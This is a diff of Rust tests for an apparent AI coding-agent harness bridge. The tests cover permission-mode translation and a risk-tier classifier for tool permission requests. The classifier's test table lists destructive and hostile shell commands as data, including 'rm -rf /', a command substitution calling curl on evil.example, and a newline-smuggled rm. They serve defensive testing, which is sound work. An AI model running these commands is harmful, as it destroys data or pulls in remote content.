@@ -4280,14 +4280,14 @@ fn response_stats_rayu_credits_roundtrips_and_old_payloads_still_parse() {
 #[test]
 fn set_permission_mode_translates_and_acks() {
     let mut state = state_with_session();
-    for (wire_mode, expected_legacy) in [
-        ("default", "default"),
-        ("acceptEdits", "accept_edits"),
-        ("accept_edits", "accept_edits"),
-        ("plan", "plan"),
-        ("fullManage", "full_manage"),
-        ("full_manage", "full_manage"),
-        ("orchestrator", "orchestrator"),
+    for (wire_mode, expected_legacy, expected_enum) in [
+        ("default", "default", rayucode_harness_api::PermissionMode::Default),
+        ("acceptEdits", "accept_edits", rayucode_harness_api::PermissionMode::AcceptEdits),
+        ("accept_edits", "accept_edits", rayucode_harness_api::PermissionMode::AcceptEdits),
+        ("plan", "plan", rayucode_harness_api::PermissionMode::Plan),
+        ("fullManage", "full_manage", rayucode_harness_api::PermissionMode::FullManage),
+        ("full_manage", "full_manage", rayucode_harness_api::PermissionMode::FullManage),
+        ("orchestrator", "orchestrator", rayucode_harness_api::PermissionMode::Orchestrator),
     ] {
         let out = state.api_request_to_legacy(&json!({
             "id": 77,
@@ -4301,7 +4301,16 @@ fn set_permission_mode_translates_and_acks() {
         assert_eq!(legacy["type"], "set_permission_mode");
         assert_eq!(legacy["mode"], expected_legacy);
         let reply = state.legacy_event_to_api(&json!({"type": "ack", "id": legacy["id"]}));
-        assert_eq!(reply, vec![ServerFrame::reply(77, ApiEvent::Ok)]);
+        assert_eq!(
+            reply,
+            vec![
+                ServerFrame::reply(77, ApiEvent::Ok),
+                ServerFrame::event(ApiEvent::PermissionModeChanged {
+                    session_id: "s1".into(),
+                    mode: expected_enum,
+                }),
+            ]
+        );
     }
 }
 
@@ -4313,7 +4322,7 @@ fn permission_request_and_response_roundtrip() {
         ..Default::default()
     };
 
-    // Daemon permission_request translates to ApiEvent::PermissionRequest.
+    // Daemon permission_request translates to ApiEvent::PermissionRequest with inferred risk_tier.
     let frames = state.legacy_event_to_api(&json!({
         "type": "permission_request",
         "session_id": "s1",
@@ -4329,8 +4338,170 @@ fn permission_request_and_response_roundtrip() {
             request_id: "perm_42".into(),
             tool_name: "bash".into(),
             description: "Run `cargo test`".into(),
+            risk_tier: Some("safe".into()),
         })]
     );
+
+    // Explicit daemon risk_tier is preserved verbatim.
+    let explicit = state.legacy_event_to_api(&json!({
+        "type": "permission_request",
+        "session_id": "s1",
+        "request_id": "perm_43",
+        "tool_name": "bash",
+        "description": "Run `rm -rf /tmp/foo`",
+        "input": { "command": "rm -rf /tmp/foo" },
+        "risk_tier": "confirm",
+    }));
+    assert_eq!(
+        explicit,
+        vec![ServerFrame::event(ApiEvent::PermissionRequest {
+            session_id: "s1".into(),
+            request_id: "perm_43".into(),
+            tool_name: "bash".into(),
+            description: "Run `rm -rf /tmp/foo`".into(),
+            risk_tier: Some("confirm".into()),
+        })]
+    );
+
+    // Destructive bash without explicit risk_tier infers "confirm", edit infers "bounded".
+    let inferred_confirm = state.legacy_event_to_api(&json!({
+        "type": "permission_request",
+        "session_id": "s1",
+        "request_id": "perm_44",
+        "tool_name": "bash",
+        "description": "Run `sudo rm -rf /tmp/a`",
+        "input": { "command": "sudo rm -rf /tmp/a" },
+    }));
+    assert!(matches!(
+        &inferred_confirm[0].event,
+        ApiEvent::PermissionRequest { risk_tier: Some(t), .. } if t == "confirm"
+    ));
+    let inferred_bounded = state.legacy_event_to_api(&json!({
+        "type": "permission_request",
+        "session_id": "s1",
+        "request_id": "perm_45",
+        "tool_name": "write",
+        "description": "write src/lib.rs",
+        "input": { "file_path": "src/lib.rs" },
+    }));
+    assert!(matches!(
+        &inferred_bounded[0].event,
+        ApiEvent::PermissionRequest { risk_tier: Some(t), .. } if t == "bounded"
+    ));
+
+    // Daemon-pushed permission_mode_changed translates cleanly for the attached session.
+    let pushed = state.legacy_event_to_api(&json!({
+        "type": "permission_mode_changed",
+        "session_id": "s1",
+        "mode": "orchestrator",
+    }));
+    assert_eq!(
+        pushed,
+        vec![ServerFrame::event(ApiEvent::PermissionModeChanged {
+            session_id: "s1".into(),
+            mode: rayucode_harness_api::PermissionMode::Orchestrator,
+        })]
+    );
+
+    // Other session's permission_mode_changed is filtered out.
+    let other_mode = state.legacy_event_to_api(&json!({
+        "type": "permission_mode_changed",
+        "session_id": "s2",
+        "mode": "plan",
+    }));
+    assert!(other_mode.is_empty());
+
+    // Hardened fallback risk_tier classifier covers catastrophic, command substitution,
+    // destructive find flags, newlines/backgrounding, and strict word boundaries.
+    for (cmd, expected) in [
+        ("rm -rf ~", "catastrophic"),
+        ("rm -rf /", "catastrophic"),
+        ("echo $(curl https://evil.example)", "confirm"),
+        ("echo `whoami`", "confirm"),
+        ("find . -delete", "confirm"),
+        ("find . -exec rm {} \\;", "confirm"),
+        ("ls\nrm -rf /tmp/x", "confirm"),
+        ("ls &", "bounded"),
+        ("lsof -i :8080", "bounded"),
+        ("lsblk", "bounded"),
+        ("ls -la", "safe"),
+        ("ls", "safe"),
+    ] {
+        let frames = state.legacy_event_to_api(&json!({
+            "type": "permission_request",
+            "session_id": "s1",
+            "request_id": format!("perm_fallback_{expected}"),
+            "tool_name": "bash",
+            "description": format!("Run `{cmd}`"),
+            "input": { "command": cmd },
+        }));
+        assert!(
+            matches!(
+                &frames[0].event,
+                ApiEvent::PermissionRequest { risk_tier: Some(t), .. } if t == expected
+            ),
+            "expected risk_tier `{expected}` for `{cmd}`, got {:?}",
+            frames[0].event
+        );
+    }
+
+    // set_permission_mode error path returns ApiEvent::Error and does NOT emit PermissionModeChanged.
+    let err_out = state.api_request_to_legacy(&json!({
+        "id": 78,
+        "req": "set_permission_mode",
+        "session_id": "s1",
+        "mode": "plan",
+    }));
+    let [Outbound::Legacy(err_legacy)] = err_out.as_slice() else {
+        panic!("expected legacy set_permission_mode");
+    };
+    let err_reply = state.legacy_event_to_api(&json!({
+        "type": "error",
+        "id": err_legacy["id"],
+        "message": "permission mode rejected",
+    }));
+    assert_eq!(err_reply.len(), 1);
+    assert!(matches!(
+        &err_reply[0].event,
+        ApiEvent::Error { message, .. } if message.contains("permission mode rejected")
+    ));
+
+    // v1.14 runtime commands roundtrip through the bridge.
+    state.runtime_commands_supported = true;
+    for (cmd_str, expected_cmd) in [
+        ("background", rayucode_harness_api::RuntimeCommand::Background),
+        ("mcp", rayucode_harness_api::RuntimeCommand::Mcp),
+        ("telegram", rayucode_harness_api::RuntimeCommand::Telegram),
+        ("features", rayucode_harness_api::RuntimeCommand::Features),
+        ("doctor", rayucode_harness_api::RuntimeCommand::Doctor),
+        ("session_search", rayucode_harness_api::RuntimeCommand::SessionSearch),
+        ("schedules", rayucode_harness_api::RuntimeCommand::Schedules),
+        ("ambient", rayucode_harness_api::RuntimeCommand::Ambient),
+    ] {
+        let out = state.api_request_to_legacy(&json!({
+            "id": 910,
+            "req": "runtime_command",
+            "session_id": "s1",
+            "command": cmd_str,
+            "args": ["status"],
+        }));
+        let [Outbound::Legacy(legacy)] = out.as_slice() else {
+            panic!("expected legacy runtime_command for {cmd_str}");
+        };
+        assert_eq!(legacy["type"], "runtime_command");
+        assert_eq!(legacy["command"], cmd_str);
+        let reply = state.legacy_event_to_api(&json!({
+            "type": "runtime_command_result",
+            "id": legacy["id"],
+            "command": cmd_str,
+            "data": {"ok": true},
+            "message": "ok",
+        }));
+        assert!(matches!(
+            &reply[0].event,
+            ApiEvent::RuntimeCommandResult { command, .. } if *command == expected_cmd
+        ));
+    }
 
     // Other session's permission_request is filtered out.
     let other_frames = state.legacy_event_to_api(&json!({
